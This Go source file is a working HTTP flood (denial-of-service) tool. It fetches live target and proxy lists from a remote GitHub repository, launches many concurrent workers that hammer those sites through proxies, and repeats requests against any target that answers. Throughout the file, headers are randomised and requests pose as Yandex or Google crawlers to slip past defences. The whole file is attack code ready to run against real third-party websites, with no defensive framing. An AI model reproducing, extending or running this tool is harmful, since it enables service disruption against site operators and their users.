package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

type SiteStruct []struct {
	Page string `json:"page"`
}
type ProxyStruct []struct {
	ID   int    `json:"id"`
	IP   string `json:"ip"`
	Auth string `json:"auth,omitempty"`
}

var timeout time.Duration
var workers int
var useProxy bool
var onlyOk bool
var repeattarget bool
var targetonly200 bool
var repeatsleepbefore int
var repeaterspawnnewworkers bool
var repeaterspawnnewworkerscount int

var repeatingworkercountactual int = 0

var maxrepeatingworkers int

var referers[] string
var useragentsandroid[] string
var useragentsios[] string
var useragentslinux[] string
var useragentswindows[] string
var yandexuseragents[] string

var accept[] string
var acceptencoding[] string
var acceptlanguage[] string

var disguiseAsBotPercentage = 1


var devices []string

var sites SiteStruct
var proxies ProxyStruct


func getSites() SiteStruct {

	url := "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json"

	spaceClient := http.Client{
		Timeout: time.Second * 10, // Timeout after 2 seconds
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		fmt.Println("Retrying sites download (req)")
		time.Sleep(time.Second * 5)
		return getSites()
	}

	res, getErr := spaceClient.Do(req)
	if getErr != nil {
		fmt.Println("Retrying sites download (execute)")
		time.Sleep(time.Second * 5)
		return getSites()
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, readErr := ioutil.ReadAll(res.Body)
	if readErr != nil {
		fmt.Println("Retrying sites download (body read)")
		time.Sleep(time.Second * 5)
		return getSites()
	}

	var sites SiteStruct

	jsonErr := json.Unmarshal(body, &sites)
	if jsonErr != nil {
		fmt.Println("Retrying sites download (json)", jsonErr)
		fmt.Println(string(body))
		time.Sleep(time.Second * 5)
		return getSites()
	}
	return sites
}
func getProxies() ProxyStruct {

	url := "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json"
	spaceClient := http.Client{
		Timeout: time.Second * 10, // Timeout after 2 seconds
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		fmt.Println("Retrying proxy download (req prepare)", err)
		time.Sleep(time.Second * 5)
		return getProxies()
	}
	
	res, getErr := spaceClient.Do(req)
	if getErr != nil {
		fmt.Println("Retrying proxy download (pre)")
		time.Sleep(time.Second * 5)
		return getProxies()
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, readErr := ioutil.ReadAll(res.Body)
	if readErr != nil {
		fmt.Println("Retrying proxy download (body)")
		time.Sleep(time.Second * 5)
		return getProxies()
	}

	var sites ProxyStruct

	jsonErr := json.Unmarshal(body, &sites)
	if jsonErr != nil {
		fmt.Println("Retrying proxy download (json)")
		time.Sleep(time.Second * 5)
		return getProxies()
	}
	return sites
}

func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, id int, repeatingbus chan int) {
	var myClient *http.Client
	if useProxy {
		if len(proxyAuth) > 0 {
			split := strings.Split(proxyAuth, ":")
			myClient = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(&url.URL{
				Scheme: "http",
				User:   url.UserPassword(split[0], split[1]),
				Host:   proxyUrl,
			})}, Timeout: timeout}
		} else {
			myClient = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(&url.URL{
				Scheme: "http",
				Host:   proxyUrl,
			})}, Timeout: timeout}
		}

	} else {
		myClient = &http.Client{Timeout: timeout}
	}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		if(ebus != nil) {
			ebus <- id
		} else {
			repeatingbus <- 0
		}
		return
	}
	setRandomHeaders(&req.Header)
	resp, err := myClient.Do(req)
	if err != nil {
		if !onlyOk {
			log.Println(err)
		}
		if(ebus != nil) {
			ebus <- id
		} else {
			repeatingbus <- 0
		}
		return
	}
	_, err2 := ioutil.ReadAll(resp.Body)
	if err2 != nil {
		if !onlyOk {
			log.Println(err)
		}
		if(ebus != nil) {
			ebus <- id
		} else {
			repeatingbus <- 0
		}
		return
	}
	if(targetonly200 && resp.StatusCode != 200) {
		if(ebus != nil) {
			ebus <- id
		} else {
			repeatingbus <- 0
		}
		return
	}
	if(repeattarget) {
		if(repeaterspawnnewworkers && ebus != nil) {
			fmt.Println(resp.StatusCode, " OK! Spawning repeater workers... ", target)
			for i := 0; i < repeaterspawnnewworkerscount; i++ {
				for(repeaterspawnnewworkerscount >= maxrepeatingworkers){
					time.Sleep(time.Millisecond * 50)
				}
				time.Sleep(time.Duration(repeatsleepbefore) * time.Millisecond)
				go requestMe(target, proxyUrl, proxyAuth, nil, i, repeatingbus)
				repeatingbus <- 1
			}

			ebus <- id
			
		} else {
			if(ebus == nil){ 
				log.Println(resp.StatusCode, " OK! Continue to target a ", target)
			} else {
				log.Println(resp.StatusCode, " OK! Found a working target, repeating ", target)
			}
			requestMe(target, proxyUrl, proxyAuth, ebus, id, repeatingbus)
		}
	} else {
		if(ebus != nil) {
			ebus <- id
		}
	}
}

func randomPercentage(percentange int) (bool) {
	return rand.Intn(100) <= percentange 
}

func randomizer() bool {
	return randomPercentage(50)
}

func rollFromList(what *[]string) string {
	n := rand.Int() % len(*what)
	return (*what)[n]
		
}

func readLines(path string) ([]string, error) {
    file, err := os.Open(path)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
    }
    return lines, scanner.Err()
}


func setRandomHeaders(header *http.Header) {
	// try to disguise as google
	if(disguiseAsBotPercentage == 100 || (disguiseAsBotPercentage > 0 && randomPercentage(disguiseAsBotPercentage))) {
		if(randomPercentage(80)) {
			if(randomPercentage(10)) {
				header.Set("User-agent", rollFromList(&yandexuseragents))

			} else if(randomPercentage(2)) {
				header.Set("user-Agent", rollFromList(&yandexuseragents))
			} else if(randomPercentage(2)) {
				header.Set("User-Agent", rollFromList(&yandexuseragents))
			} else {
				header.Set("user-agent", rollFromList(&yandexuseragents))
			}
			header.Set("accept-encoding", "gzip, deflate, br")

		} else {
			header.Set("accept", "application/signed-exchange;v=b3,*/*;q=0.8")
			header.Set("accept-encoding", "gzip, deflate, br")
			header.Set("amp-cache-transform", "google;v=\"1..8\"")
			header.Set("user-agent", "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Google-AMPHTML)")
		}
		return
	}
	if(randomPercentage(81)) {
		header.Set("referer", rollFromList(&referers))
	}
	rolledDevice := rollFromList(&devices)
	switch(rolledDevice) {
	case "ANDROID":
		useragent := rollFromList(&useragentsandroid)
		header.Set("user-agent", useragent)
		if(strings.Contains(useragent, "Chrom") && randomPercentage(97)) {
			// Need here to roll these 99 values
			header.Set("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"")
			header.Set("sec-ch-ua-mobile", "?1")
			header.Set("sec-fetch-dest", "document")
			header.Set("sec-fetch-mode", "navigate")
			header.Set("sec-fetch-site", "none")
			header.Set("sec-fetch-user", "?1")
		}
	case "IOS":
		useragent := rollFromList(&useragentsios)
		header.Set("user-agent", useragent)
		if(strings.Contains(useragent, "Chrom") && randomPercentage(97)) {
			// Need here to roll these 99 values
			header.Set("sec-ch-ua", "\"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\", \"Lighthouse\";v=\"9.3.0\"")
			header.Set("sec-ch-ua-mobile", "?0")
			header.Set("sec-ch-ua-platform", "macOS")
		}
	case "LINUX":
		useragent := rollFromList(&useragentslinux)
		header.Set("user-agent", useragent)
		if(strings.Contains(useragent, "Chrom") && randomPercentage(97)) {
			// Need here to roll these 99 values
			header.Set("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"")
			header.Set("sec-ch-ua-mobile", "?0")
			header.Set("sec-fetch-dest", "document")
			header.Set("sec-fetch-mode", "navigate")
			header.Set("sec-fetch-site", "none")
			header.Set("sec-fetch-user", "?1")
		}
	case "WINDOWS":
		useragent := rollFromList(&useragentswindows)
		header.Set("user-agent", useragent)
		if(strings.Contains(useragent, "Chrom") && randomPercentage(97)) {
			// Need here to roll these 99 values
			header.Set("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"")
			header.Set("sec-ch-ua-mobile", "?0")
			header.Set("sec-ch-ua-platform", "Windows")
			header.Set("sec-fetch-dest", "document")
			header.Set("sec-fetch-mode", "navigate")
			header.Set("sec-fetch-site", "none")
			if(randomPercentage(60)) {
				header.Set("sec-fetch-site", "cross-site")
			}
			header.Set("sec-fetch-user", "?1")
		}
	}

	if(randomPercentage(32)) {
		header.Set("cache-control", "max-age=0")
	}
	if(randomPercentage(20)) {
		header.Set("cache-control", "no-cache")
	}
	if(randomPercentage(23)) {
		header.Set("device-memory", "8")
		if(randomPercentage(20)) {
			header.Set("device-memory", "4")
		} else if(randomPercentage(10)) {
			header.Set("device-memory", "2")
		} else if(randomPercentage(20)) {
			header.Set("device-memory", "1")
		} else if(randomPercentage(10)) {
			header.Set("device-memory", "0.5")
		}
	}
	if(randomPercentage(15)) {
		header.Set("ect", "4g")
	}
	if(randomPercentage(15)) {
		header.Set("rtt", "50")
	}
	if(randomPercentage(15)) {
		header.Set("dpr", "1")
	}
	if(randomPercentage(13)) {
		header.Set("viewport-width", "1920")

		if(randomPercentage(50)) {
			header.Set("viewport-width", "800")
		}
	}
	if(randomPercentage(79)) {
		header.Set("upgrade-insecure-requests", "1")
	}
	if(randomPercentage(99)) {
		header.Set("accept-encoding", rollFromList(&acceptencoding))
	}
	if(randomPercentage(99)) {
		header.Set("accept", rollFromList(&accept))
	}
	if(randomPercentage(99)) {
		header.Set("accept-language", rollFromList(&acceptlanguage))
	}
}

func gogogo(ebus chan int, id int, repeatingbus chan int) {
	nSite := rand.Int() % len(sites)
	nProxy := rand.Int() % len(proxies)

	site := sites[nSite]
	proxy := proxies[nProxy]
	requestMe(site.Page, proxy.IP, proxy.Auth, ebus, id, repeatingbus)

}

func spawner(ebus chan int, repeatingbus chan int) {
	for true {
		id := <-ebus
		for(repeattarget && repeaterspawnnewworkerscount >= maxrepeatingworkers){
			time.Sleep(time.Millisecond * 50)
			fmt.Println("Waiting for more workers available")
		}
		go gogogo(ebus, id, repeatingbus)
	}
}

func configUpdater() {
	for true {
		time.Sleep(time.Minute * 15)
		fmt.Println("CONFIG UPDATE")
		sites = getSites()
		proxies = getProxies()
		fmt.Println("CONFIG UPDATED")
	}

}
func repeatworkercount(bus chan int) {
	for true {
		was := <-bus
		if(was == 0) {
			repeatingworkercountactual = repeatingworkercountactual - 1
		} else {
			repeatingworkercountactual = repeatingworkercountactual + 1
		}
	}

}

func main() {
	referers, _ = readLines("resources/referers.txt")
	useragentsandroid, _ = readLines("resources/androidagents.txt")
	useragentsios, _ = readLines("resources/iosagents.txt")
	useragentslinux, _ = readLines("resources/linuxagents.txt")
	useragentswindows, _ = readLines("resources/windowsagents.txt")

	acceptencoding, _ = readLines("resources/accept-encoding.txt")
	acceptlanguage, _ = readLines("resources/accept-language.txt")
	accept, _ = readLines("resources/accept.txt")
	yandexuseragents, _ = readLines("resources/yandex.txt")


	workers, _ = strconv.Atoi(os.Getenv("WORKERS"))
	repeatsleepbefore, _ = strconv.Atoi(os.Getenv("REPEATSLEEPBEFORE"))
	disguiseAsBotPercentage, _ = strconv.Atoi(os.Getenv("DISGUISEASBOTPERCENTAGE"))
	timeoutFrom, _ := strconv.Atoi(os.Getenv("TIMEOUT"))
	timeout = time.Duration(timeoutFrom) * time.Millisecond
	useProxyOS := os.Getenv("USEPROXY")
	useProxy = useProxyOS == "true"
	onlyOkOs := os.Getenv("ONLYOK")
	onlyOk = onlyOkOs == "true"
	repeattargetOs := os.Getenv("REPEATTARGET")
	repeaterspawnnewworkerscount , _ = strconv.Atoi(os.Getenv("REPEATERSPAWNNEWWORKERSCOUNT"))
	repeaterspawnnewworkersOs := os.Getenv("REPEATERSPAWNNEWWORKERS")
	repeaterspawnnewworkers = repeaterspawnnewworkersOs == "true"
	targetonly200Os := os.Getenv("TARGETONLY200")
	targetonly200 = targetonly200Os == "true"

	

	maxrepeatingworkers, _ = strconv.Atoi(os.Getenv("MAXREPEATING"))

	repeattarget = repeattargetOs == "true"
	devices = make([]string, 4)
	devices[0] = "ANDROID"
	devices[1] = "WINDOWS"
	devices[2] = "LINUX"
	devices[3] = "IOS"

	rand.Seed(time.Now().Unix())
	eventbus := make(chan int)
	repeatingbus := make(chan int)
	sites = getSites()
	proxies = getProxies()
	for i := 0; i < workers/100+1; i++ {
		fmt.Println("Spawning spawner", i)
		go spawner(eventbus, repeatingbus)
	}
	for i := 0; i < workers; i++ {
		fmt.Println("Spawning worker", i)
		go gogogo(eventbus, i, repeatingbus)
	}
	go repeatworkercount(repeatingbus)
	configUpdater()
}
